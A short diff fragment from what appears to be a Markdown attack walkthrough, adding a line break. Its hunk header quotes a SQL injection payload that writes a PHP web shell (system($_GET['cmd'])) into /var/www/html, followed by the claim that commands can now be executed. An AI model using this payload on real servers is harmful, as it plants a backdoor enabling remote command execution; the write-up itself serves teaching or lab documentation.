@@ -101,6 +101,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/hack.php"
 <br/>
 
 We can execute commands now
+<br/>
 ![](Selection_013.png)
 <br/>
 
